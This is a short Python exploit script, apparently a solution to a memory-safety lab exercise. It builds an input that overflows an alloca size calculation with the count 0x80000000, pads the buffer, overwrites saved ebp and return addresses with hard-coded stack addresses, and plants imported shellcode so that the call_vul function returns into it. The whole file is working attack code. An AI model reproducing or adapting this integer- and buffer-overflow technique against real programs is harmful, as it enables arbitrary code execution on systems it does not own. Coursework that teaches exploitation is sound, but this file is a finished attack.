import sys
from shellcode import shellcode

# ebp of the read_file function
read_file_ebp = b"\xd8\xb1\xf6\xbf"

# return address of the read_file function
read_file_return_addr = b"\x2c\x9a\x04\x08"

# ebp of the call_vul function
call_vul_ebp = b"\xf8\xb1\xf6\xbf"

# return address of the call_vul function that points to temp
call_vul_return_addr = b"\x46\xb1\xf6\xbf"

# malicious count input for overflowing alloca size calculation
malicious_count = b"\x00\x00\x00\x80"

sys.stdout.buffer.write(malicious_count)
sys.stdout.buffer.write(b"a" * 40)
sys.stdout.buffer.write(read_file_ebp)
sys.stdout.buffer.write(read_file_return_addr)
sys.stdout.buffer.write(b"a" * 22)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"a" * (146 - len(shellcode)))
sys.stdout.buffer.write(call_vul_ebp)
sys.stdout.buffer.write(call_vul_return_addr)

